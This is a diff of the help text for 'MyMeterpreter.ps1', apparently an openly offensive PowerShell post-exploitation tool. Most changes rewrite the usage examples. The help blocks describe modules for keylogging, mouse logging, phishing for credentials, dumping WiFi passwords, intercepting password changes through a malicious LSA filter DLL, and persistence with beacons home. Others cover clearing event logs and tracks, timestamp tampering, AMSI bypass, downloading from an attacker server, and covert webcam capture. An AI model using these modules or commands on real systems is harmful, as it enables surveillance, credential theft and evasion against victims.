-      PS C:\> .\MyMeterpreter.ps1 -SysInfo Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -SysInfo Verbose
       Remote Host Detailed Enumeration Module
    #>!bye..
 
@@ -2416,10 +2406,10 @@ $HelpParameters = @"
       Helper - Enumerate remote host DNS cache entrys
       
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetDnsCache Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetDnsCache Clear
       Clear Dns Cache entrys {delete entrys}
 
    .OUTPUTS
@@ -2438,19 +2428,18 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Author: @r00t-3xp10it
       Helper - Gets a list of ESTABLISHED connections (TCP)
    
    .DESCRIPTION
       Enumerates ESTABLISHED TCP connections and retrieves the
-      ProcessName associated from the connection PID identifier
+      ProcessName associated from the connection PID (Id) identifier
     
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetConnections Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetConnections Verbose
-      Retrieves process info from the connection PID identifier
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetConnections Verbose
+      Retrieves process info from the connection PID (Id) identifier
 
    .OUTPUTS
       Proto  Local Address          Foreign Address        State           Id
@@ -2479,7 +2468,7 @@ $HelpParameters = @"
       Enumerates appl installed and respective versions
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetInstalled Enum
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetInstalled Enum
 
    .OUTPUTS
       DisplayName                   DisplayVersion     
@@ -2503,15 +2492,15 @@ $HelpParameters = @"
       then cmdlet 'kill' or 'enum' the sellected processName.
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum
       Enumerate ALL Remote Host Running Process(s)
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Enum -ProcessName firefox.exe
       Enumerate firefox.exe Process {Id,Name,Path,Company,StartTime,Responding}
 
    .EXAMPLE
-      PC C:\> .\MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
+      PC C:\> powershell -File MyMeterpreter.ps1 -GetProcess Kill -ProcessName firefox.exe
       Kill Remote Host firefox.exe Running Process
 
    .OUTPUTS
@@ -2544,22 +2533,23 @@ $HelpParameters = @"
       Remark: Tasks have the default duration of 9 hours.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Enum
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create
       Use module default settings to create the demo task
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Delete -TaskName mytask
       Deletes mytask taskname
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetTasks Create -TaskName mytask -Interval 10 -Exec "cmd /c start calc.exe"
 
    .OUTPUTS
       TaskName                                 Next Run Time          Status
       --------                                 -------------          ------
+      mytask                                   24/01/2021 17:43:44    Running
       ASUS Smart Gesture Launcher              N/A                    Ready          
       CreateExplorerShellUnelevatedTask        N/A                    Ready          
       OneDrive Standalone Update Task-S-1-5-21 24/01/2021 17:43:44    Ready 
@@ -2572,7 +2562,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Helper - Enumerate eventvwr logs OR Clear All event logs
+      Helper - Enumerate\Clear eventvwr logs
 
    .NOTES
       Required Dependencies: wevtutil {native}
@@ -2580,19 +2570,19 @@ $HelpParameters = @"
       on shell to be abble to 'Clear' Eventvwr entrys.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Enum
       Lists ALL eventvwr categorie entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose
-      List the newest 10(default) Powershell\Application\System entrys
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose
+      List the newest 10 (default) Powershell\Application\System entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Verbose -NewEst 28
       List the newest 28 Eventvwr Powershell\Application\System entrys
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetLogs Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetLogs Clear
       Remark: Clear @arg requires Administrator privs on shell
 
    .OUTPUTS
@@ -2619,11 +2609,11 @@ $HelpParameters = @"
       And identify install browsers and run enum modules.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Enum
       Identify installed browsers and versions
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetBrowsers Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetBrowsers Verbose
       Run enumeration modules againts ALL installed browsers
 
    .OUTPUTS
@@ -2648,11 +2638,11 @@ $HelpParameters = @"
       or to spy target user activity using -Delay parameter.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Screenshot 1
+      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 1
       Capture 1 desktop screenshot and store it on %TMP%.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Screenshot 5 -Delay 8
+      PS C:\> powershell -File MyMeterpreter.ps1 -Screenshot 5 -Delay 8
       Capture 5 desktop screenshots with 8 secs delay between captures.
 
    .OUTPUTS
@@ -2668,21 +2658,21 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Helper - List computer cameras or capture camera screenshot
+      Helper - List computer device names or capture snapshot
 
    .NOTES
-      Remark: WebCam turns the ligth ON taking snapshots.
+      Remark: WebCam turns the ligth 'ON' taking snapshots.
       Using -Camera Snap @argument migth trigger AV detection
       Unless target system has powershell version 2 available.
       In that case them PS version 2 will be used to execute
       our binary file and bypass AV amsi detection.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Camera Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Enum
       List ALL WebCams Device Names available
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Camera Snap
+      PS C:\> powershell -File MyMeterpreter.ps1 -Camera Snap
       Take one screenshot using default camera
 
    .OUTPUTS
@@ -2707,22 +2697,22 @@ $HelpParameters = @"
       to allow users to silent browse/read/download files from remote host.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python
       Downloads webserver.ps1 to %TMP% and executes the webserver.
       Remark: This Module uses Social Enginnering to trick remote host into
       installing python (python http.server) if remote host does not have it.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Python -SPort 8087
       Downloads webserver.ps1 and executes the webserver on port 8087
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell
       Downloads Start-WebServer.ps1 and executes the webserver.
       Remark: Admin privileges are requiered in shell to run the WebServer
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
+      PS C:\> powershell -File MyMeterpreter.ps1 -StartWebServer Powershell -SPort 8087
       Downloads Start-WebServer.ps1 and executes the webserver on port 8087
       Remark: Admin privileges are requiered in shell to run the WebServer
    #>!bye..
@@ -2745,7 +2735,7 @@ $HelpParameters = @"
 
    .EXAMPLE
       Syntax : .\MyMeterpreter.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
-      Example: .\MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
+      Example: powershell -File MyMeterpreter.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination `$Env:TMP\FileName.ps1
       Download FileName.ps1 script from attacker apache2 (192.168.1.73) into `$Env:TMP\FileName.ps1 Local directory.
    #>!bye..
 
@@ -2764,14 +2754,13 @@ $HelpParameters = @"
       its deleted or is process {void.exe} its stoped.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Keylogger Start
-      Download/Execute void.exe in child process
-      to be abble to capture system keystrokes
+      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Start
+      Start recording target system keystrokes
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Keylogger Stop
-      Stop keylogger by is process FileName identifier
-      and delete keylogger and all respective files/logs
+      PS C:\> powershell -File MyMeterpreter.ps1 -Keylogger Stop
+      Stop keylogger by is process FileName identifier and delete
+      keylogger script and all respective files/logs left behind.
 
    .OUTPUTS
       StartTime ProcessName PID  LogFile                                   
@@ -2798,11 +2787,11 @@ $HelpParameters = @"
       Required Dependencies: psr.exe {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start
+      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start
       Capture Screenshots of Mouse Clicks for 10 secs {default}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -Mouselogger Start -Timmer 28
       Capture Screenshots of remote Mouse Clicks for 28 seconds
 
    .OUTPUTS
@@ -2831,7 +2820,7 @@ $HelpParameters = @"
       Remark: On Windows <= 10 lmhosts and lanmanserver are running by default.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -PhishCreds Start
+      PS C:\> powershell -File MyMeterpreter.ps1 -PhishCreds Start
       Prompt the current user for a valid credential.
 
    .OUTPUTS
@@ -2859,12 +2848,12 @@ $HelpParameters = @"
       Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Enum
       Scans GroupName Everyone and permissions (F)
       Unquoted Service vuln Paths, Dll-Hijack, etc.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -EOP Verbose
+      PS C:\> powershell -File MyMeterpreter.ps1 -EOP Verbose
       Scans the Three Group Names and Permissions (F)(W)(M)
       And presents a more elaborate report with extra tests.
 
@@ -2896,17 +2885,17 @@ $HelpParameters = @"
       to manual check the status of wscript process (BeaconHome function)
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste Stop
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste Stop
       Stops wscript process (vbs) and delete persistence.vbs script
       Remark: This function stops the persiste.vbs from beacon home
       and deletes persiste.vbs Leaving our reverse tcp shell intact.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1
       Execute Payload.ps1 at every StartUp with 10 sec of interval between each execution
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
+      PS C:\> powershell -File MyMeterpreter.ps1 -Persiste `$Env:TMP\Payload.ps1 -BeaconTime 28
       Execute Payload.ps1 at every StartUp with 28 sec of interval between each execution
 
    .OUTPUTS
@@ -2937,15 +2926,15 @@ $HelpParameters = @"
       Required Dependencies: netsh {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords Dump
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords Dump
       Dump ALL Wifi Passwords on this terminal prompt
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump
       Dump Wifi Paswords into a Zip archive on %TMP% {default}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
+      PS C:\> powershell -File MyMeterpreter.ps1 -WifiPasswords ZipDump -Storage `$Env:APPDATA
       Dump Wifi Paswords into a Zip archive on %APPDATA% remote directory
 
    .OUTPUTS
@@ -2976,16 +2965,16 @@ $HelpParameters = @"
       Remark: -Rate Parameter configs the SpeechSynthesizer speed
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World"
+      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World"
       Make remote host speak "Hello World" {-Rate 1 -Volume 88}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
+      PS C:\> powershell -File MyMeterpreter.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
 
    .OUTPUTS
       RemoteHost SpeachSpeed Volume Speak        
       ---------- ----------- ------ -----        
-      SKYNET     1           88     'hello world'
+      SKYNET     5           100    'hello world'
    #>!bye..
 
 "@;
@@ -3000,6 +2989,7 @@ $HelpParameters = @"
    .NOTES
       Required Dependencies: Wscript ComObject {native}
       Remark: Double Quotes are Mandatory in -MsgBox value
+      Remark: -TimeOut 0 parameter maintains the msgbox open.
 
       MsgBox Button Types
       -------------------
@@ -3011,15 +3001,20 @@ $HelpParameters = @"
       5 - Show Retry and Cancel buttons. 
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World."
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World."
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
-      Spawns message box with Yes and No buttons
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 4
+      Spawn message box and close msgbox after 4 seconds time {-TimeOut 4}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -MsgBox "Hello World." -TimeOut 5
-      When the Timeout is reached (seconds) the MessageBox closes.
+      PS C:\> powershell -File MyMeterpreter.ps1 -MsgBox "Hello World." -ButtonType 4
+      Spawns message box with Yes and No buttons {-ButtonType 4}
+
+   .OUTPUTS
+      TimeOut  ButtonType           Message
+      -------  ----------           -------
+      5 (sec)  'Yes and No buttons' 'Hello World.'
    #>!bye..
 
 "@;
@@ -3043,7 +3038,7 @@ $HelpParameters = @"
       Remark: Use double quotes if path contains any empty spaces.
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\MyMeterpreter.zip
+      PS C:\> powershell -File MyMeterpreter.ps1 -BruteZip `$Env:USERPROFILE\Desktop\MyMeterpreter.zip
       Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.
 
    .OUTPUTS
@@ -3072,11 +3067,11 @@ $HelpParameters = @"
       Required Dependencies: cmd|regedit {native}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Clear
+      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Clear
       Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -CleanTracks Paranoid
+      PS C:\> powershell -File MyMeterpreter.ps1 -CleanTracks Paranoid
       Remark: Paranoid @arg deletes @MyMeterpreter auxiliary scripts
 
    .OUTPUTS
@@ -3093,32 +3088,31 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @mubix|@r00t-3xp10it
-      Helper - Search for credentials in diferent locations {store|regedit|disk}
+      Helper - Search for creds in diferent locations {store|regedit|disk}
       Helper - Stealing passwords every time they change {mitre T1174}
 
    .DESCRIPTION
-      -GetPasswords Dump Explores a native OS notification of when
-      the user account password gets changed which is responsible for
-      validating it. That means that the password can be intercepted and logged.
-      -GetPasswords Enum searchs credentials in disk\regedit diferent locations.
+      -GetPasswords Enum searchs creds in disk\regedit diferent locations.
+      -GetPasswords Dump Explores a native OS notification of when the user
+      account password gets changed which is responsible for validating it.
+      That means that the user password can be intercepted and logged.
 
    .NOTES
       -GetPasswords Dump requires Administrator privileges to add reg keys
       And the manual deletion of `$Env:WINDIR\System32\0evilpwfilter.dll from
       target disk at the end and also the deletion of the follow registry key:
-      hklm\system\currentcontrolset\control\lsa /v "notification packages" /d scecli\0evilpwfilter
       REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum
       Dumps passwords from disk\regedit diferent locations
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Enum -StartDir $Env:USERPROFILE
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Enum -StartDir `$Env:USERPROFILE
       Searches for credentials recursive in text files starting in -StartDir
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -GetPasswords Dump
+      PS C:\> powershell -File MyMeterpreter.ps1 -GetPasswords Dump
       Intercepts user changed passwords {logon}
 
    .OUTPUTS
@@ -3134,7 +3128,7 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
-      Change file mace time {timestamp}
+      Helper - Change file mace time {timestamp}
 
    .DESCRIPTION
       This module changes the follow mace propertys:
@@ -3142,14 +3136,14 @@ $HelpParameters = @"
 
    .NOTES
       -Date parameter format: "08 March 1999 19:19:19"
-      Remark: Double quotes are mandatory in -Date parameter
+      Remark: Double quotes are mandatory in -Date param
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt
+      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt
       Changes sellected file mace using MyMeterprter default -Date "data-format"
 
    .EXAMPLE
-      PS C:\> .\MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
+      PS C:\> powershell -File MyMeterpreter.ps1 -FileMace `$Env:TMP\test.txt -Date "08 March 1999 19:19:19"
       Changes sellected file mace using user inputed -Date "data-format"
 
    .OUTPUTS
